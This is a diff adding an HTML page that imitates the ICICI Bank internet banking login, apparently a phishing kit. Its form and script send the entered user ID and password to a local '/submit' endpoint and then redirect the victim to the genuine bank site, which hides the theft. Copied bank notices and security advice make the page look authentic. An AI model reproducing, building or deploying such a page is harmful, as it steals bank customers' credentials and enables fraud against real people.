@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Internet Banking</title>
+
+    <style>
+
+        body {
+            margin: 0;
+            font-family: Arial,Helvetica,sans-serif;
+            font-size: 1rem;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #212529;
+            text-align: left;
+            background-color: #fff;
+        }
+
+        .container {
+            max-width: 1100px;  
+            width: 100%;
+            padding-right: 1rem;
+            padding-left: 1rem;
+            margin-right: auto;
+            margin-left: auto;
+        }
+
+        .top-nav-content {
+            display: flex;
+            justify-content: space-between;
+            padding-left: 100px;
+        }
+
+        .top-nav-list {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            gap: 10px;
+            
+        }
+
+        .top-nav-list li {
+            list-style-type: none;
+            font-family: Arial,Helvetica,sans-serif;
+            display: inline;
+            font-size: 12px;
+            height: 14px;
+            color: #606060;
+            border-right: 1px solid #666;
+            padding-right: 8px;
+            padding-left: 0;
+            cursor: pointer;
+            margin: 5px 0 0;
+        }
+
+        .top-nav-list li:hover {
+            text-decoration: underline;
+        }
+
+        .main-nav-list {
+            display: flex;
+            list-style: none;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            margin: 0;
+        }
+
+        .main-nav-list li {
+            cursor: pointer;
+            padding-left: 10px;
+            padding-right: 10px;
+            font-family: Arial,Helvetica,sans-serif;
+            font-size: 14px;
+            color: #FFF;
+            text-decoration: none;
+            display: block;
+        }
+
+        .main-nav-list li:hover {
+            color: blue;
+        }
+
+        .intro-bg img {
+            z-index: -1;
+            height: 34rem;
+            width: 100%;
+            object-fit: cover;
+            object-position: left;
+        }
+
+
+        .login-form {
+            border-radius: 5px;
+            height: 24rem !important;
+            background: white;
+            width: 260px;
+            padding: 1.2rem;
+            margin: 0 0 0 auto;
+            box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+        }
+
+        .other-section {            
+            display: flex;
+            justify-content: flex-end;
+            padding-right: 80px;
+            margin-top: -520px;
+        }
+
+        /*
+        .other-section * {
+            background: white;
+        }
+
+        */
+        /****************** COPIED *****/
+
+
+        .container .row {
+            max-width: 960px;
+            margin-left: 90px;
+        }
+
+        .row {
+            display: flex;
+            margin-right: -15px;
+            margin-left: -15px;
+        }
+
+        .col-md-7 {
+            padding-left: 0;
+        }
+
+        @media (min-width: 768px) {
+            .col-md-7 {
+                -webkit-box-flex: 0;
+                -ms-flex: 0 0 58.333333%;
+                flex: 0 0 58.333333%;
+                max-width: 58.333333%;
+            }
+        }
+
+        .col-md-5, .col-md-7 {
+            position: relative;
+            width: 100%;
+            min-height: 1px;
+            padding-right: 15px;
+            padding-left: 15px;
+        }
+
+        .col-md-5 {
+            padding-right: 0;
+        }
+
+        @media (min-width: 768px) {
+            .col-md-5 {
+                -webkit-box-flex: 0;
+                -ms-flex: 0 0 41.666667%;
+                flex: 0 0 41.666667%;
+                max-width: 41.666667%;
+            }
+        }
+
+        .col-md-5 .info {
+            padding: 1.5rem;
+            width: 77%;
+            margin-left: 120px;
+            padding: 0.8rem 2rem;
+        }
+
+        .col-md-5 .info {
+            padding: 0.8rem 2rem;
+        }
+
+        .info {
+            background: white;
+            box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            border-radius: 5px;
+            padding: 2rem;
+            height: 100%;
+        }
+
+        .card {
+            position: relative;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            min-width: 0;
+            word-wrap: break-word;
+            background-color: #fff;
+            background-clip: border-box;
+            border: 1px solid rgba(0,0,0,.125);
+            border-radius: .25rem;
+        }
+
+        .col-md-7 .info ul li, .col-md-5 .info ul li  {
+            font-size: 0.75rem;
+            padding-top: 0.5rem;
+        }
+
+        .col-md-7 .info {
+            width: 90%;
+            padding: 0.8rem 2rem;
+        }
+
+        .col-md-5 .info .heading img {
+            width: 16px;
+            height: 16px;
+        }
+
+
+        .col-md-5 .info {
+            padding: 1.5rem;
+            width: 77%;
+            margin: 0 0 0 auto;
+            padding: 0.8rem 2rem;
+        }
+        .login .notice .col-md-5 .info {
+            padding: 0.8rem 2rem;
+        }
+        .login .notice .info {
+            background: white;
+            box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
+            border-radius: 5px;
+            padding: 2rem;
+            height: 100%;
+        }
+
+
+        .info h5 {
+            color: #0B3C6D;
+            font-size: 1rem;
+            font-weight: bold;
+            padding-top: 0!important;
+            margin: 0;
+        }
+
+        .login {
+            font-family: 'Helvetica';
+        }
+
+        .content-bottom {
+            padding-top: 50px;
+        }
+    
+        .content-bottom {
+            max-width: 960px;
+            margin: 0 auto;
+        }
+
+        .sub-text {
+            font-size: 0.75rem;
+            margin-bottom: 0!important;
+        }
+
+        .para-link {
+            color: #F27B1A;
+            cursor: pointer;
+        }
+
+        input:focus {
+            outline: none;
+            border: 1px solid #F27B1A!important;
+            background: #FFFFF9;
+        }
+
+        input[type=text].input_text:focus, .input_text:focus, input[type=text]:focus, input[type=password]:focus {
+            -webkit-box-shadow: 0 0 1px 0 rgba(235,146,44,1)!important;
+            -moz-box-shadow: 0 0 1px 0 rgba(235,146,44,1)!important;
+            box-shadow: 0 0 1px 0 rgba(235,146,44,1);
+            outline: 0;
+        }
+
+
+
+        .login-iciciibank {
+            background-color: #F27B1A;
+            position: relative;
+            font-size: 1rem;
+            color: white !important;
+            line-height: 2rem;
+            letter-spacing: 0.46px;
+            text-align: center;
+            width: 10rem;
+            height: 2rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 2em;
+            transition: background-color 0.2s ease-in;
+            margin: 1.2rem 0;
+            cursor: pointer;
+            border: none;
+        }
+
+        select {
+            /* -webkit-appearance: none;
+            -moz-appearance: none; */
+            text-indent: 1px;
+            text-overflow: '';
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+    </style>
+
+</head>
+
+<body>
+    
+    <nav>
+        <div class="container">
+            <div class="top-nav-content">
+                <img width="197" height="46" src="/imgs/icici-bank-logo-v1.png" alt="">
+
+                <ul class="top-nav-list">
+                    <li>ICICI Bank Home</li>
+                    <li>About Us</li>
+                    <li>Customer Care</li>
+                    <li>Find ATM/Branch</li>
+                    <li style="display: flex; justify-content: flex-start; align-items: center;">
+                        <img src="/imgs/mobile-banking.png" height="20px" width="14px" alt=""> Mobile Banking</li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <nav style="background-color: #F27B1A;">
+
+        <div class="container">
+
+            <div class="main-nav-content">
+            <ul class="main-nav-list">
+                <li>Personal</li>
+                <li>Privilege</li>
+                <li>Wealth</li>
+                <li>Private</li>
+                <li>NRI</li>
+                <li>Business</li>
+                <li>SME</li>
+                <li>Corporate</li>
+                <li>Deals & More</li>
+                <li>Help</li>
+            </ul>
+
+        </div>
+
+    </nav>
+
+    <main>
+
+        <section class="intro-bg">
+            <div class="container">
+                <img src="/imgs/icici-intro-img_v2.jpg" width="1100" height="544" style="padding-left: 30px;" alt="">
+            </div>
+        </section>
+
+    </main>
+
+    <div class="container">
+
+        <div class="other-section">
+            <div class="login-form">
+                <form id="loginForm" action="/submit" method="POST">
+                    <div class="login-form-title" style="display: flex; align-items: center;">
+                        <img src="/imgs/login-lock.png" style="color: #F27B1A;" height="18" width="18" alt="">
+                        <h5 style="margin: 0; font-family: Arial,Helvetica,sans-serif; font-size: 16px; font-weight: 700; color: #0B3C6D;">
+                            Login to Internet Banking
+                        </h5>
+                    </div>
+            
+                    <div class="login-userid" style="display: flex; flex-direction: column;">
+                        <span style="font-family: Arial,Helvetica,sans-serif; font-size: 12px; font-weight: 700; margin-top: 13px; color: #194D7D;">User ID</span>
+                        <div style="display: flex; align-items: center;">
+                            <input name="username" class="login-username-iciciibank" type="text" style="
+                                box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
+                                border-radius: 5px;
+                                border: none;
+                                width: 68%;
+                                height: 1.8rem;
+                                font-size: 0.75rem;
+                                padding: 0 1rem;
+                                background-color: #f7f7f7;
+                                margin-right: 8px;">
+                            <span class="userid-keyboard" style="cursor: pointer;">
+                                <img src="/imgs/keyboard.png" alt="">
+                            </span>
+                        </div>
+                        <span>
+                            <a href="#" style="
+                                margin-left: 154px;
+                                color: #F27B1A;
+                                font-size: 0.575rem;
+                                font-style: oblique;
+                                text-decoration: none;">
+                                Get User ID
+                            </a>
+                        </span>
+                    </div>
+            
+                    <div class="login-password">
+                        <div class="login-userid" style="display: flex; flex-direction: column;">
+                            <span style="font-family: Arial,Helvetica,sans-serif; font-size: 12px; font-weight: 700; color: #194D7D;">Password</span>
+                            <div style="display: flex; align-items: center;">
+                                <input name="password" class="login-password-iciciibank" type="password" style="
+                                    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
+                                    border-radius: 5px;
+                                    border: none;
+                                    width: 68%;
+                                    height: 1.8rem;
+                                    font-size: 0.75rem;
+                                    padding: 0 1rem;
+                                    background-color: #f7f7f7;
+                                    margin-right: 8px;">
+                                <span class="userid-keyboard" style="cursor: pointer;">
+                                    <img src="/imgs/keyboard.png" alt="">
+                                </span>
+                            </div>
+                            <span>
+                                <a href="#" style="
+                                    margin-left: 154px;
+                                    color: #F27B1A;
+                                    font-size: 0.575rem;
+                                    font-style: oblique;
+                                    text-decoration: none;">
+                                    Get Password
+                                </a>
+                            </span>
+                        </div>
+                    </div>
+            
+                    <div class="login-password" style="display: flex; flex-direction: column;">
+                        <span style="font-family: Arial,Helvetica,sans-serif; font-size: 12px; font-weight: 700; margin-top: 13px;">
+                            Start In
+                        </span>
+                        <select name="start_in" style="
+                            background: url(/imgs/selectbox_bg.jpg) no-repeat scroll left top transparent;
+                            color: #000;
+                            font-size: 12px;
+                            height: 24px;
+                            border: none;
+                            width: 220px;">
+                            <option value="Dashboard">Dashboard</option>
+                        </select>
+                    </div>
+
+                    <input type="hidden" name="website" value="https://infinity.icicibank.com" />
+                    <input type="hidden" id="currentDateTime" name="date" value="" />
+            
+                    <div class="rememberme" style="display: flex; gap: 0.4rem; align-items: center; margin-top: 10px;">
+                        <input type="checkbox" name="remember_user" style="width: 16px; height: 16px; border-radius: 5px; border: none;">
+                        <span style="font-size: 12px;">Remember User Id</span>
+                    </div>
+            
+                    <div class="login" style="display: flex; justify-content: space-between; align-items: center;">
+                        <button type="button" id="loginButton" class="login-iciciibank" style="
+                            box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
+                            border: none;">
+                            Login
+                        </button>
+                        <a href="#" style="
+                            color: #F27B1A;
+                            font-size: 0.625rem;
+                            font-style: oblique;
+                            text-decoration: none;">
+                            Trouble logging in?
+                        </a>
+                    </div>
+            
+                    <div class="help" style="display: flex; justify-content: space-between; align-items: baseline; border-top: 1px solid #D8D8D8; margin-top: 30px;">
+                        <span style="color: #F27B1A; font-size: 0.725rem;">Login with Mobile Number</span>
+                        <span style="color: #F27B1A; font-size: 0.725rem;">Need Help?</span>
+                    </div>
+                </form>
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <section class="notice" style="margin-top: 30px;">
+        <div class="container">
+            
+            <div class="row main-div">
+                <div class="col-md-7">
+                    <div class="info card" style="font-family: Helvetica;">
+                        <h5>Important Notices</h5>
+                        <ul style="list-style: none; padding: 0; margin: 0;">
+                            <li>
+                                1) As per RBI guidelines, Real-Time Gross Settlement (RTGS) is available 24x7 with effect from Dec 14, 2020. Please 
+                                <a class="para-link" href="#" target="_blank">click here</a> for details.
+                            </li>
+                            <li>
+                                2) Introduction of charges for cash deposit in Cash Acceptor/Recycler Machines on bank holidays and post banking hours on working days with effect from Nov 01, 2020. 
+                                <a class="para-link" href="#" target="_blank">Click here</a> to know more.
+                            </li>
+                            <li>
+                                3) The ICICI Bank and Ferrari S.p.A partnership is coming to a close and hence, we will be discontinuing the Ferrari Credit Card programme. As a result of this development, there will be no renewal card issued against your card. Instead, we are offering you an alternate Credit Card suited to your lifestyle needs.
+                            </li>
+                            <li>
+                                4) As per RBI guidelines, National Electronic Funds Transfer (NEFT) is available 24x7 with effect from Dec 16, 2019. Please 
+                                <a class="para-link" href="#" target="_blank">click here</a> for details.
+                            </li>
+                            <li>
+                                5) OTP/URN for internet banking transactions for NRI customers which was earlier sent on email, is now sent on SMS at customer’s registered India/International Mobile numbers. Key transactions where OTP/URN will be sent on SMS are- Funds Transfer/Add payee or biller*/Online User id/Password generation and Risk based OTP. Please note that post new payee/biller addition, there will be a 30 minutes cooling period before NRI customers can initiate a transaction to the newly added payee/biller
+                            </li>
+                            <li>
+                                6) <strong>Please note funds from NRO/Resident accounts cannot be transferred to an NRE account</strong>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="col-md-5">
+                    <div class="info card" style="width: 240px;    margin-left: 20px;">
+                        <div class="heading" style="display: flex; gap: 0.6rem; align-items: center;">
+                            <img src="/imgs/question.png" alt=" question mark icon">
+                            <h5>Did you know</h5>
+                        </div>
+                        <ul style="padding: 0; margin: 0;">
+                            <li>
+                                Experience the all new Bill Pay! Over 18,000+ Billers to pay from. Simply choose your Biller and pay Bill in few clicks.
+                            </li>
+                            <li>
+                                Have a dream to fulfil or a goal to achieve? Get the funds you need with an ICICI Bank Instant Personal Loan. T&amp;C apply.
+                            </li>
+                            <li>
+                                Cannot save every month? No worries! With iWish Flexible RD you can save any amount, anytime to achieve your wishes.&nbsp;
+                                <a class="para-link" href="#" target="_blank">Create your goal</a>. T&amp;C apply.
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="content-bottom">
+                <h5 class="pt-4 pt-md-5">Important security information</h5>
+                <div class="pt-2 mb-5 sub-text">
+                    <ul>
+                        <li>
+                            Before logging in, please ensure that the URL address on the address bar of your internet browser starts with https://infinity.iciciibank.com.
+                        </li>
+                        <li>
+                            Never provide your User ID or password to any one on phone or in response to a mail.
+                            <a href="#" title="Report a suspicious mail." class="para-link" target="_blank">Report a suspicious mail</a>
+                        </li>
+                        <li>
+                            Do not enter login or other sensitive information in any pop up window.
+                        </li>
+                        <li>
+                            Verify the site's security certificate by clicking on the padlock icon of your internet browser. For more details 
+                            <a href="#" title="click here." class="para-link" target="_blank">click here</a>
+                        </li>
+                    </ul>
+                </div>
+                <h5 class="pt-4 pt-md-5">Digital Security</h5>
+                <div class="pt-2 mb-5 sub-text">
+                    <p>https://infinity.icicibank.com has been verified by Entrust. The communication of your private information from any address beginning with "https" is encrypted and secured using SSL.</p>
+                </div>
+            </div>
+            
+        </div>
+
+    </section>
+
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function () {
+            document.getElementById('currentDateTime').value = new Date().toISOString();
+            
+            // Fetch the form data
+            const form = document.getElementById('loginForm');
+            const formData = new FormData(form);
+
+            // Perform POST request using Fetch API
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect after successful form submission
+                    window.location.href = `https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*11w9uul*_ga*MTk4ODY0MjIyNC4xNjA5MjM2MjAy*_ga_SFRXTKFEML*MTYwOTI0MTA0NC4yLjAuMTYwOTI0MTA0NC42MA..`;
+                } else {
+                    alert('Login failed. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            });
+        });
+    </script>
+
+</body>
+</html>
